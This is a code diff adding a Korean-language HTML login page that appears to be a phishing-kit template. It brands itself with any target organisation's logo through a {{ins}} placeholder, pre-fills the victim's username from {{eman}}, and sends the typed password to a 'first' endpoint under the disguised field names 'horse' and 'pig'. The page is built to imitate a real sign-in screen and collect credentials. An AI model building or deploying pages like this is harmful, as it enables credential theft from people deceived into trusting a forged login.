@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>로그인</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url(https://images.unsplash.com/photo-1487147264018-f937fba0c817?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTF8fGJhY2tncm91bmR8ZW58MHx8MHx8fDA%3D);
+      background-size: cover;
+      width: 500px;
+      height: 500px;
+      background-position: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Sans-serif font */
+      color: #fff; /* Light text color for better readability */
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      height: 420px;
+      background: linear-gradient(to right, #FFA07A, #FFD700); /* Gradient orange background */
+      border-radius: 45px;
+      color: #2E8B57; /* Dark green text color */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 70px 30px;
+      animation: shake 0.5s ease-in-out, fadeIn 1s ease-in-out; /* Shaking and fade-in effects */
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Box shadow for depth effect */
+    }
+
+    @keyframes shake {
+      0%, 100% {
+        transform: translateX(0);
+      }
+      25%, 75% {
+        transform: translateX(-10px);
+      }
+      50% {
+        transform: translateX(10px);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    .login-container p {
+      margin: 0;
+      padding: 0;
+      font-weight: bold;
+      font-size: 20px; /* Increase font size for headings */
+      color: #333; /* Darker text color */
+    }
+
+    .login-container input {
+      width: 100%;
+      margin-bottom: 20px;
+      padding: 10px;
+      border-radius: 8px;
+      transition: border-bottom 0.3s, transform 0.3s; /* Smooth transition on input */
+      animation: inputPulse 1s infinite alternate; /* Pulsating effect for input fields */
+    }
+
+    @keyframes inputPulse {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.02);
+      }
+    }
+
+    .login-container input[type="text"],
+    input[type="password"] {
+      border: none;
+      border-bottom: 1px solid #fff;
+      background: rgba(255, 255, 255, 0.8); /* Slightly transparent white background */
+      outline: none;
+      height: 40px;
+      color: #333; /* Darker text color */
+      font-size: 16px;
+    }
+
+    .login-container input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-bottom: 1px solid #2E8B57; /* Dark green highlight color on focus */
+      transform: scale(1.02); /* Slight scale effect on focus */
+    }
+
+    .login-container input[type="submit"] {
+      border: none;
+      outline: none;
+      height: 40px;
+      background: #2E8B57; /* Dark green button background */
+      color: #fff; /* White text color */
+      font-size: 18px;
+      border-radius: 20px;
+      transition: background 0.3s, color 0.3s; /* Smooth transition on submit button */
+    }
+
+    .login-container input[type="submit"]:hover {
+      cursor: pointer;
+      background: #3CB371; /* Lighter green shade for hover */
+      color: #fff;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2); /* Hover box shadow effect */
+      animation: buttonPulse 0.5s ease-in-out; /* Pulsating effect for the submit button on hover */
+    }
+
+    @keyframes buttonPulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    h1 {
+      margin: 0;
+      padding: 0 0 20px;
+      text-align: center;
+      font-size: 24px; /* Increase font size for the main heading */
+      color: #333; /* Darker text color */
+    }
+
+    .login-container a {
+      text-decoration: none;
+      font-size: 14px;
+      color: #fff;
+      transition: color 0.3s; /* Smooth transition on anchor tag hover */
+    }
+
+    .login-container a:hover {
+      color: #3CB371; /* Lighter green shade for hover */
+    }
+
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      position: absolute;
+      top: -50px;
+      left: calc(50% - 50px);
+    }
+
+    @media (max-width: 600px) {
+      .login-container {
+        height: auto;
+        padding: 50px 30px;
+      }
+
+      .avatar {
+        width: 80px;
+        height: 80px;
+        top: -40px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="login-container">
+  <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
+  <h1>여기에 로그인하세요</h1>
+  <form action="first" method="post">
+    <p>사용자 이름</p>
+    <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
+    <p>비밀번호</p>
+    <input type="password" name="pig" placeholder="암호를 입력" required>
+    <input type="submit" name="submit" value="로그인">
+    <a href="#">비밀번호 분실</a>
+  </form>
+</div>
+</body>
+</html>
